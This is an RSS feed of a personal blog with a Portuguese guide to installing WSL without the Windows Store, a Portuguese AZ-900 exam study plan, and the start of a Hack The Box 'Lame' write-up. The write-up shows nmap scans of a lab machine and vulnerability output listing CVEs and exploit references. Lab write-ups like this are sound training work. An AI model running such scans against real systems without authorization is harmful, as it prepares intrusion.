<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Natan Maia Morette</title>
        <link>https://nmmorette.github.io/posts/</link>
        <description>Recent content in Posts on Natan Maia Morette</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Sat, 17 Dec 2022 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://nmmorette.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Instalar WSL sem Windows Store</title>
            <link>https://nmmorette.github.io/posts/2022/12/instalar-wsl-sem-windows-store/</link>
            <pubDate>Sat, 17 Dec 2022 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2022/12/instalar-wsl-sem-windows-store/</guid>
            <description>Instalar WSL sem Windows Store Talvez você se depare com a necessidade de instalar alguma instancia WSL em uma máquina windows onde a Windows Store não está disponível. Esse cenário pode acontecer em muitos ambientes corporativos, onde a loja é bloqueada devido a baselines de segurança ou por algum outro motivo.
Nesse caso é necessário seguir alguns passos para instalar o WSL e fazer o download das imagens de diferentes tipos de sistemas Linux.</description>
            <content type="html"><![CDATA[<h1 id="instalar-wsl-sem-windows-store">Instalar WSL sem Windows Store</h1>
<p>Talvez você se depare com a necessidade de instalar alguma instancia WSL em uma máquina windows onde a Windows Store não está disponível. Esse cenário pode acontecer em muitos ambientes corporativos, onde a loja é bloqueada devido a baselines de segurança ou por algum outro motivo.</p>
<p>Nesse caso é necessário seguir alguns passos para instalar o WSL e fazer o download das imagens de diferentes tipos de sistemas Linux.</p>
<h2 id="pré-requisitos">Pré requisitos</h2>
<p>É necessário estar rodando Windows 10 versão 2004 ou superior ( Build 19041 ou maior), ou Windows 11. Se você está utilizando uma versão anterior, faça update do seu sistema.</p>
<h2 id="1---habilitando-o-wsl">1 - Habilitando o WSL</h2>
<p>Abra o PowerShell como <strong>administrador</strong> e digite o comando:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">dism.exe /online /enable-feature /featurename<span style="color:#960050;background-color:#1e0010">:</span>Microsoft-Windows-Subsystem-Linux /all /norestart
</code></pre></div><p>Esse comando vai habilitar os componentes necessários para o funcionamento do WSL.</p>
<h2 id="2---habilite-o-serviço-de-máquina-virtual">2 - Habilite o serviço de Máquina Virtual</h2>
<p>Depois de instalar o WSL, é preciso habilitar o serviço de Máquina Virtual do windows.
Com o Powershell aberto digite:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">dism.exe /online /enable-feature /featurename<span style="color:#960050;background-color:#1e0010">:</span>VirtualMachinePlatform /all /norestart
</code></pre></div><h2 id="3---download-do-pacote-linux-kernel-update">3 - Download do pacote Linux Kernel update</h2>
<p>Download da última versão:</p>
<p>• <a href="https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi">WSL2 Linux kernel update package for x64 machines</a></p>
<p>Após instalar o pacote de atualização siga para o próximo passo.</p>
<p>4 - Configure o WSL 2 como padrão</p>
<p>Com o PowerShell aberto rode o comando abaixo para configurar o WSL 2 como o serviço padrão:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">wsl --set-default-version 2
</code></pre></div><h2 id="4---download-e-instalação-do-linux">4 - Download e Instalação do Linux</h2>
<p>Aqui é possível encontrar os links de download dos pacotes fora da Windows Store:</p>
<ul>
<li><a href="https://aka.ms/wslubuntu">Ubuntu</a></li>
<li><a href="https://aka.ms/wslubuntu2204">Ubuntu 22.04 LTS</a></li>
<li><a href="https://aka.ms/wslubuntu2004">Ubuntu 20.04</a></li>
<li><a href="https://aka.ms/wslubuntu2004arm">Ubuntu 20.04 ARM</a></li>
<li><a href="https://aka.ms/wsl-ubuntu-1804">Ubuntu 18.04</a></li>
<li><a href="https://aka.ms/wsl-ubuntu-1804-arm">Ubuntu 18.04 ARM</a></li>
<li><a href="https://aka.ms/wsl-ubuntu-1604">Ubuntu 16.04</a></li>
<li><a href="https://aka.ms/wsl-debian-gnulinux">Debian GNU/Linux</a></li>
<li><a href="https://aka.ms/wsl-kali-linux-new">Kali Linux</a></li>
<li><a href="https://aka.ms/wsl-sles-12">SUSE Linux Enterprise Server 12</a></li>
<li><a href="https://aka.ms/wsl-SUSELinuxEnterpriseServer15SP2">SUSE Linux Enterprise Server 15 SP2</a></li>
<li><a href="https://aka.ms/wsl-SUSELinuxEnterpriseServer15SP3">SUSE Linux Enterprise Server 15 SP3</a></li>
<li><a href="https://aka.ms/wsl-opensuse-tumbleweed">openSUSE Tumbleweed</a></li>
<li><a href="https://aka.ms/wsl-opensuseleap15-3">openSUSE Leap 15.3</a></li>
<li><a href="https://aka.ms/wsl-opensuseleap15-2">openSUSE Leap 15.2</a></li>
<li><a href="https://aka.ms/wsl-oraclelinux-8-5">Oracle Linux 8.5</a></li>
<li><a href="https://aka.ms/wsl-oraclelinux-7-9">Oracle Linux 7.9</a></li>
<li><a href="https://github.com/WhitewaterFoundry/WSLFedoraRemix/releases/">Fedora Remix for WSL</a></li>
</ul>
<p>Escolha a versão que deseja, faça o download e salve o arquivo com extensão <code>.appx</code></p>
<p>Se você preferir, você também pode fazer o download da distribuição via linha de comando utilizando Powershell com <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest">Invoke-WebRequest</a>. Nesse caso, download do Ubuntu 20.04:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Invoke-WebRequest -Uri https<span style="color:#960050;background-color:#1e0010">:</span>//aka.ms/wslubuntu2004 -OutFile Ubuntu.appx -UseBasicParsing
</code></pre></div><p>Também é possível fazer o download via <code>curl.exe</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">curl.exe -L -o ubuntu-2004.appx https<span style="color:#960050;background-color:#1e0010">:</span>//aka.ms/wslubuntu2004
</code></pre></div><p>Após o download do pacote, é preciso fazer a instalação do mesmo com o comando <code>Add-AppxPackage</code></p>
<p>⚠️ Lembre-se de abrir na linha de comando o local onde o pacote foi baixado.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Add-AppxPackage .\app_name.appx
</code></pre></div><p>Mude  <code>.\app_name.appx</code> para o nome do pacote que foi feito download.</p>
<h2 id="5---instalação-do-windows-terminal-opcional">5 - Instalação do Windows Terminal (opcional)</h2>
<p>Utilizando o Windows Terminal você tem opção de abrir múltiplas abas com suas diferentes versões do Linux instaladas.</p>

    <img src="/images/wsl/0.png"  class="center"  style="border-radius: 10px;"  />


<p><a href="https://apps.microsoft.com/store/detail/windows-terminal/9N0DX20HK701?hl=pt-br&amp;gl=br">Download do Windows Terminal</a></p>
<h3 id="51---instalação-sem-windows-store">5.1 - Instalação sem Windows Store</h3>
<p>Partindo do princípio que não temos acesso a Windows Store, o link acima não vai funcionar, portanto é preciso fazer a instalação manual.</p>
<p>Faça o download do arquivo <code>.msixbundle</code> <a href="https://github.com/microsoft/terminal/releases">aqui</a>.</p>

    <img src="/images/wsl/1.png"  class="center"  style="border-radius: 10px;"  />


<p>Abra o Powershell como administrador e vá até a pasta onde o arquivo foi salvo.</p>
<p>Rode o comando de instalação:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Add-AppxPackage Microsoft.WindowsTerminalPreview_Win10_1.16.2641.0_8wekyb3d8bbwe.msixbundle
</code></pre></div><p>⚠️ Atente-se ao nome do arquivo, a versão baixada pode ser difetente.</p>

    <img src="/images/wsl/2.png"  class="center"  style="border-radius: 10px;"  />


<p>O <code>Windows Terminal</code>foi instalado.</p>

    <img src="/images/wsl/3.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>RoadMap para AZ-900 (Pt-br)</title>
            <link>https://nmmorette.github.io/posts/2021/09/roadmap-para-az-900-pt-br/</link>
            <pubDate>Mon, 06 Sep 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/09/roadmap-para-az-900-pt-br/</guid>
            <description>Introdução O intuito desse post é ajudar os interessados em fazer a prova AZ-900 Microsoft 365 Fundamentals. Nesse post vou falar um pouco sobre a prova e sobre o meu plano de estudos para aprovação.
A prova tem nível fundamental ou seja é uma prova baseada em conceitos e não há prática, o foca é entender os conceitos do azure e de cada serviço. Ter uma noção básica do que cada serviço do azure faz é fundamental.</description>
            <content type="html"><![CDATA[
    <img src="/images/az-900/az.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="introdução">Introdução</h2>
<p>O intuito desse post é ajudar os interessados em fazer a prova AZ-900 Microsoft 365 Fundamentals.
Nesse post vou falar um pouco sobre a prova e sobre o meu plano de estudos para aprovação.</p>
<p>A prova tem nível fundamental ou seja é uma prova baseada em conceitos e não há prática, o foca é entender os conceitos do azure e de cada serviço. Ter uma noção básica do que cada serviço do azure faz é fundamental.</p>
<p>Além disso essa prova é considerada uma prova de entrada para o mundo Azure, sendo assim após essa prova, você pode optar por seguir o caminho azure de infra ou de dev.</p>
<h2 id="sobre-a-prova">Sobre a prova</h2>



<blockquote>

Os candidatos a este exame devem ter conhecimentos básicos nos serviços em nuvem e como os serviços são provisionados com o Microsoft Azure.



<br>



<br>

O exame Azure Fundamentals é uma oportunidade para avaliar o
conhecimento dos candidatos nos conceitos de nuvem, serviços básicos do Azure, preços, SLA e ciclo de vida do Azure e os fundamentos de segurança, privacidade, conformidade e confiabilidade na nuvem.


<br>



<br>


Este exame foi desenvolvido para pessoas que estão iniciando no ambiente de soluções e serviços baseados em nuvem. Os candidatos devem ser capazes de demonstrar um conhecimento básico nos conceitos de nuvem, bem como serviços, cargas de trabalho, segurança, privacidade, preços e suporte do Azure. Além disso, devem estar familiarizados com os conceitos de rede, armazenamento, computação, suporte a aplicativos e desenvolvimento de aplicativos.
</blockquote>

<p>A prova possui 41 questões e é preciso ter 70% de acerto.</p>
<p>A prova custa em torno de 60 dólares, porém procure participar de eventos da Microsoft como o <a href="https://www.microsoft.com/en-us/trainingdays">Microsoft Training Day </a> onde é possível ganhar vouchers para realizar a prova.</p>

    <img src="/images/az-900/preco.png"  class="center"  style="border-radius: 10px;"  />


<p>O exame pode ser agendado tanto presencial quanto online, eu fiz o exame de forma presencial depois de ter problemas com a realização online.</p>
<p>As questões são de múltipla escolha, verdadeiro ou falso e também questões de correlacionar. 
Um tipo de questão diferente nessa prova, no meu caso foram duas, é uma questão onde você deve clicar na área correspondente da ferramenta. A questão mostra um print de uma tela do Microsoft Azure com partes &ldquo;clicáveis&rdquo; e você deve clicar na área correta de acordo com a pergunta.</p>
<p>Minha prova foi realizada no dia 03/09/2021, idioma inglês.</p>
<h2 id="composição-da-prova">Composição da Prova</h2>
<ul>
<li>Descrever os conceitos do cloud (20-25%)</li>
<li>Descrever os principais serviços do Azure (15-20%</li>
<li>Descrever as principais soluções e ferramentas de administração no Azure (10-15%)</li>
<li>Descrever os recursos gerais de segurança e segurança de rede (10-15%)</li>
<li>Descrever recursos de identidade, governança, privacidade e conformidade (20-25%)</li>
<li>Descrever o administração de custos do Azure e Service Level Agreements (10-15%)</li>
</ul>
<p>O documento completo com a estrutura da prova pode ser encontrado <a href="https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE3VwUY">aqui</a>.</p>
<h2 id="preparação">Preparação</h2>
<p>Na minha opinião existem duas formas de se preparar para essa prova: uma é com conteúdos gratuitos e outra com conteúdo pago.</p>
<h3 id="conteúdo-gratuito">Conteúdo Gratuito</h3>
<p>Na internet é possível encontrar diversas fontes de estudo gratuitas para essa prova.</p>
<p>Eu recomendo o canal <a href="https://www.youtube.com/channel/UCg8OCdG1yeiSPFDyqQDxHnw">A guide to Cloud</a> além do conteúdo para az-900 ele possui outros vídeos para certificações da microsoft.</p>

    <img src="/images/az-900/guidetocloud.png"  class="center"  style="border-radius: 10px;"  />


<p>A playlist do curso é bem completa com todo conteúdo da prova:</p>


<iframe width="560" height="315" src="https://www.youtube.com/embed/UyaZWgkuQE8" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>


<p>Outra forma de preparação são os cursos gratuitos da <a href="https://www.linkedin.com/company/ka-solution/">KaSolution</a>, eles estão sempre promovendo cursos aos sábados. Completos para várias formações Microsoft.
Infelizmente para esse método você vai precisar contar com a sorte de abrirem uma turma gratuita. 
Basta ficar de olho na rede social deles, o último AZ-900 foi no dia 28/08/2021.</p>

    <img src="/images/az-900/ka.png"  class="center"  style="border-radius: 10px;"  />


<p>Eu fiz o curso da Ka Solution para me preparar para essa prova. Inclusive eles fornecem certificado de conclusão:</p>

    <img src="/images/az-900/certificado.png"  class="center"  style="border-radius: 10px;"  />


<h3 id="conteúdo-pago">Conteúdo Pago</h3>
<p>Como recomendação de conteúdo pago eu deixo o curso da <a href="https://cursos.alura.com.br">Alura</a>, eu fiz a formação completa deles como uma revisão, já que eu tinha feito o curso gratuito da <a href="https://www.linkedin.com/company/ka-solution/">KaSolution</a>.</p>
<p>No <a href="https://www.udemy.com">Udemy</a> também é possível encontrar muitos cursos de preparação para az-900 com valores acessíveis.</p>
<p>Na <a href="https://www.kasolution.com.br/Home?pt=google">KaSolution</a> além dos cursos gratuitos é possível comprar diversas formações para preparação de certificações diversas da Microsoft.</p>
<p>Além disso é possível comprar o livro oficial da microsoft para preparação, infelizmente para essa prova eu não comprei, devido o valor elevado aqui no Brasil. Entretanto eu conheço os livros de outras certificações da microsoft que tirei e eles são bem completos e recomendo muito quando é possível encontrar com preços acessíveis.</p>

    <img src="/images/az-900/book.jpg"  class="center"  style="border-radius: 10px;"  />


<h2 id="simulados">Simulados</h2>
<p>Acredito que os simulados são uma preparação extra para prova, muitos não apoiam a ideia porém a própria microsoft vende os famosos brain dumps. Dentro da página de agendamento é possível encontrar um link para compra:</p>

    <img src="/images/az-900/exame.png"  class="center"  style="border-radius: 10px;"  />


<p>Esse eu realmente não indico a compra, nunca comprei devido o alto valor solicitado.</p>
<p>Uma opção gratuita para testar seu conhecimento com questões é o site: <a href="https://www.itexams.com">IT Exams</a>, especificamente para o AZ-900 eles possuem um banco de dados com 244 questões.</p>

    <img src="/images/az-900/itexams.png"  class="center"  style="border-radius: 10px;"  />


<p>Outra forma porém paga, é comprar simulados preparatórios no Udemy, existem vários na plataforma. 
Eu recomendo esse <a href="https://www.udemy.com/course/az-900-5-practice-tests-on-ms-365-certification">aqui</a>. As questões refletem a dinâmica da prova, sendo uma ótima maneira de treinar.</p>

    <img src="/images/az-900/udemy.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="tópicos-importantes">Tópicos importantes</h2>
<p>Esse item pode ser um pouco complicado, não existe o tópico mais importante! Porém aqui descrevo os tópicos que percebi na prova com mais frequência.</p>
<ul>
<li>
<p>Conceitos básicos de Nuvem</p>
<p>É fundamental saber o que é PaaS,Saas,Iaas. Algumas questões na minha prova informaram um serviço da Microsoft e pediam na resposta para identificar em qual tipo de serviço na nuvem ele se enquadrava. 
Também é fundamental saber a diferença entre CapEx e OpEx, Nuvem Pública e Privada.
Outro ponto aqui é saber quais serviços do Azure são aplicáveis em ambiente On-premise, algumas questões pegam nesse ponto, na minha prova por exemplo uma questão pedia para informar se o Azure Sentinel também tinha abrangência em ambiente on-premises e outra perguntou o mesmo porém para o serviço Azure Monitor.</p>
</li>
<li>
<p>Onde executar e onde encontrar informações:</p>
<p>Muitas questões perguntavam onde era possível encontrar a política de dados da Microsoft ou onde era possível gerar relatórios de desempenho, onde é possível ver os alertas de saúde do serviço. Você precisa saber onde cada informação dessa pode ser encontrada, por isso é fundamental saber o que cada página do Azure Portal faz.</p>
<p>Outro ponto importante aqui é como executar uma tarefa, muitas questões perguntavam qual o menu para abrir o Azure Shell ou se é possível criar máquinas virtuais de um celular android ou computador Mac. Outra questão mostrava uma tela de tipos de armazenamentos e perguntava qual era o ideal para utilização em VM&rsquo;s.</p>
</li>
<li>
<p>Conceitos de segurança:</p>
<p>Tive duas questões na minha prova que basicamente perguntavam a diferença entre NSGs, Azure Firewall e Application Firewall. Em duas questões tive como resposta o Azure Key Vault, ambas as questões descreveram formas diferentes de utilizar o serviço. Uma única questão perguntou sobre o Azure Sentinel, seguindo o padrão da maioria das questões a pergunta descrevia uma ação e era preciso dizer qual é o serviço.</p>
</li>
</ul>
<p>Como eu disse esses são só pontos em destaque que eu percebi que foram muito cobrados na minha prova, então não foque só nesses. Mas se você leu e sabe o que são todos esses itens e entende o que cada um deles faz, você provavelmente já tem uma boa base para prova.</p>
<h2 id="dia-da-prova">Dia da Prova</h2>
<p>Primeiramente eu havia marcado a prova para o dia 02/09/2021 de forma online com a PersonVue. 
Realizei o teste do ambiente com o software e deu tudo certo, esperei a hora da prova e fiz todo o procedimento inicial: enviar minha foto, foto do documento e foto do ambiente.</p>
<p>Na hora do exame de forma pontual o proctor me chamou via chamada de voz e iniciou a prova, porém aparecia um erro genérico <em>&ldquo;Hmmm Something it&rsquo;s wrong&rdquo;</em> e simplesmente não consegui iniciar a prova. 
Falei com o proctor que tentou me ajudar, mas sem sucesso. Repeti todo o processo umas cinco vezes e falei com cinco proctores diferente em cada uma delas e nenhum pode ajudar. 
Na quinta tentativa eu pedi o cancelamento do exame, já que a solução dada era sempre reiniciar a máquina.</p>
<p>Após cancelar o exame, por sorte consegui marcar presencial no dia seguinte 03/09/2021 no Instituto Infnet no Rio de Janeiro.</p>

    <img src="/images/az-900/badge.png"  class="center"  style="border-radius: 10px;"  />




<br>


    <img src="/images/az-900/cert.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>Hack the Box - Lame - Write Up</title>
            <link>https://nmmorette.github.io/posts/2021/09/hack-the-box-lame-write-up/</link>
            <pubDate>Wed, 01 Sep 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/09/hack-the-box-lame-write-up/</guid>
            <description>Enumeration Initial scan:
└─$ sudo nmap -sS -Pn 10.10.10.3 [sudo] password for venomsnake: Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 10:40 -03 Nmap scan report for 10.10.10.3 Host is up (0.17s latency). Not shown: 996 filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 139/tcp open netbios-ssn 445/tcp open microsoft-ds Nmap done: 1 IP address (1 host up) scanned in 20.</description>
            <content type="html"><![CDATA[
    <img src="/images/htb/lame/banner.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="enumeration">Enumeration</h2>
<p>Initial scan:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#960050;background-color:#1e0010">└─$</span> sudo nmap <span style="color:#f92672">-</span>sS <span style="color:#f92672">-</span>Pn <span style="color:#ae81ff">10.10.10.3</span>
[sudo] password <span style="color:#66d9ef">for</span> venomsnake: 
Host discovery disabled (<span style="color:#f92672">-</span>Pn). All addresses will be marked <span style="color:#960050;background-color:#1e0010">&#39;</span>up<span style="color:#960050;background-color:#1e0010">&#39;</span> and scan times will be slower.
Starting Nmap <span style="color:#ae81ff">7.91</span> ( https:<span style="color:#75715e">//nmap.org ) at 2021-09-01 10:40 -03
</span><span style="color:#75715e"></span>Nmap scan report <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10.10.3</span>
Host is up (<span style="color:#ae81ff">0.17</span>s latency).
Not shown: <span style="color:#ae81ff">996</span> filtered ports
PORT    STATE SERVICE
<span style="color:#ae81ff">21</span><span style="color:#f92672">/</span>tcp  open  ftp
<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp  open  ssh
<span style="color:#ae81ff">139</span><span style="color:#f92672">/</span>tcp open  netbios<span style="color:#f92672">-</span>ssn
<span style="color:#ae81ff">445</span><span style="color:#f92672">/</span>tcp open  microsoft<span style="color:#f92672">-</span>ds

Nmap done: <span style="color:#ae81ff">1</span> IP address (<span style="color:#ae81ff">1</span> host up) scanned in <span style="color:#ae81ff">20.61</span> seconds
</code></pre></div><p>Second nmap scan with <code>--script vuln</code> and <code>-A</code> only on the open ports:21,22,139 and 445.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#960050;background-color:#1e0010">└─$</span> sudo nmap <span style="color:#f92672">-</span>sS <span style="color:#f92672">-</span>Pn <span style="color:#ae81ff">10.10.10.3</span> <span style="color:#f92672">-</span>A <span style="color:#f92672">--</span>script vuln <span style="color:#f92672">-</span>p21,<span style="color:#ae81ff">22</span>,<span style="color:#ae81ff">139</span>,<span style="color:#ae81ff">445</span>
Host discovery disabled (<span style="color:#f92672">-</span>Pn). All addresses will be marked <span style="color:#960050;background-color:#1e0010">&#39;</span>up<span style="color:#960050;background-color:#1e0010">&#39;</span> and scan times will be slower.
Starting Nmap <span style="color:#ae81ff">7.91</span> ( https:<span style="color:#75715e">//nmap.org ) at 2021-09-01 10:44 -03
</span><span style="color:#75715e"></span>Pre<span style="color:#f92672">-</span>scan script results:
<span style="color:#f92672">|</span> broadcast<span style="color:#f92672">-</span>avahi<span style="color:#f92672">-</span>dos: 
<span style="color:#f92672">|</span>   Discovered hosts:
<span style="color:#f92672">|</span>     <span style="color:#ae81ff">224.0.0.251</span>
<span style="color:#f92672">|</span>   After NULL UDP avahi packet DoS (CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2011</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1002</span>).
<span style="color:#f92672">|</span>_  Hosts are all up (not vulnerable).
Nmap scan report <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10.10.3</span>
Host is up (<span style="color:#ae81ff">0.26</span>s latency).

PORT    STATE SERVICE     VERSION
<span style="color:#ae81ff">21</span><span style="color:#f92672">/</span>tcp  open  ftp         vsftpd <span style="color:#ae81ff">2.3.4</span>
<span style="color:#f92672">|</span>_sslv2<span style="color:#f92672">-</span>drown: 
<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp  open  ssh         OpenSSH <span style="color:#ae81ff">4.7</span>p1 Debian <span style="color:#ae81ff">8u</span>buntu1 (protocol <span style="color:#ae81ff">2.0</span>)
<span style="color:#f92672">|</span> vulners: 
<span style="color:#f92672">|</span>   cpe:<span style="color:#f92672">/</span>a:openbsd:openssh:<span style="color:#ae81ff">4.7</span>p1: 
<span style="color:#f92672">|</span>     	SECURITYVULNS:VULN:<span style="color:#ae81ff">8166</span>	<span style="color:#ae81ff">7.5</span>	https:<span style="color:#75715e">//vulners.com/securityvulns/SECURITYVULNS:VULN:8166
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	MSF:ILITIES<span style="color:#f92672">/</span>OPENBSD<span style="color:#f92672">-</span>OPENSSH<span style="color:#f92672">-</span>CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2010</span><span style="color:#f92672">-</span><span style="color:#ae81ff">4478</span><span style="color:#f92672">/</span>	<span style="color:#ae81ff">7.5</span>	https:<span style="color:#75715e">//vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2010-4478/	*EXPLOIT*
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	MSF:ILITIES<span style="color:#f92672">/</span>LINUXRPM<span style="color:#f92672">-</span>ELSA<span style="color:#f92672">-</span><span style="color:#ae81ff">2008</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0855</span><span style="color:#f92672">/</span>	<span style="color:#ae81ff">7.5</span>	https:<span style="color:#75715e">//vulners.com/metasploit/MSF:ILITIES/LINUXRPM-ELSA-2008-0855/	*EXPLOIT*
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2010</span><span style="color:#f92672">-</span><span style="color:#ae81ff">4478</span>	<span style="color:#ae81ff">7.5</span>	https:<span style="color:#75715e">//vulners.com/cve/CVE-2010-4478
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2008</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1657</span>	<span style="color:#ae81ff">6.5</span>	https:<span style="color:#75715e">//vulners.com/cve/CVE-2008-1657
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	SSV:<span style="color:#ae81ff">60656</span>	<span style="color:#ae81ff">5.0</span>	https:<span style="color:#75715e">//vulners.com/seebug/SSV:60656	*EXPLOIT*
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2017</span><span style="color:#f92672">-</span><span style="color:#ae81ff">15906</span>	<span style="color:#ae81ff">5.0</span>	https:<span style="color:#75715e">//vulners.com/cve/CVE-2017-15906
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2010</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5107</span>	<span style="color:#ae81ff">5.0</span>	https:<span style="color:#75715e">//vulners.com/cve/CVE-2010-5107
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	MSF:ILITIES<span style="color:#f92672">/</span>SUSE<span style="color:#f92672">-</span>CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2011</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5000</span><span style="color:#f92672">/</span>	<span style="color:#ae81ff">3.5</span>	https:<span style="color:#75715e">//vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2011-5000/	*EXPLOIT*
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	MSF:ILITIES<span style="color:#f92672">/</span>ORACLE<span style="color:#f92672">-</span>SOLARIS<span style="color:#f92672">-</span>CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2012</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0814</span><span style="color:#f92672">/</span>	<span style="color:#ae81ff">3.5</span>	https:<span style="color:#75715e">//vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2012-0814/	*EXPLOIT*
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	MSF:ILITIES<span style="color:#f92672">/</span>GENTOO<span style="color:#f92672">-</span>LINUX<span style="color:#f92672">-</span>CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2011</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5000</span><span style="color:#f92672">/</span>	<span style="color:#ae81ff">3.5</span>	https:<span style="color:#75715e">//vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2011-5000/	*EXPLOIT*
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	MSF:ILITIES<span style="color:#f92672">/</span>AMAZON<span style="color:#f92672">-</span>LINUX<span style="color:#f92672">-</span>AMI<span style="color:#f92672">-</span>ALAS<span style="color:#f92672">-</span><span style="color:#ae81ff">2012</span><span style="color:#f92672">-</span><span style="color:#ae81ff">99</span><span style="color:#f92672">/</span>	<span style="color:#ae81ff">3.5</span>	https:<span style="color:#75715e">//vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-ALAS-2012-99/	*EXPLOIT*
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2012</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0814</span>	<span style="color:#ae81ff">3.5</span>	https:<span style="color:#75715e">//vulners.com/cve/CVE-2012-0814
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2011</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5000</span>	<span style="color:#ae81ff">3.5</span>	https:<span style="color:#75715e">//vulners.com/cve/CVE-2011-5000
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2008</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5161</span>	<span style="color:#ae81ff">2.6</span>	https:<span style="color:#75715e">//vulners.com/cve/CVE-2008-5161
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2011</span><span style="color:#f92672">-</span><span style="color:#ae81ff">4327</span>	<span style="color:#ae81ff">2.1</span>	https:<span style="color:#75715e">//vulners.com/cve/CVE-2011-4327
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	MSF:ILITIES<span style="color:#f92672">/</span>SSH<span style="color:#f92672">-</span>OPENSSH<span style="color:#f92672">-</span>X11USELOCALHOST<span style="color:#f92672">-</span>X11<span style="color:#f92672">-</span>FORWARDING<span style="color:#f92672">-</span>SESSION<span style="color:#f92672">-</span>HIJACK<span style="color:#f92672">/</span>	<span style="color:#ae81ff">1.2</span>	https:<span style="color:#75715e">//vulners.com/metasploit/MSF:ILITIES/SSH-OPENSSH-X11USELOCALHOST-X11-FORWARDING-SESSION-HIJACK/	*EXPLOIT*
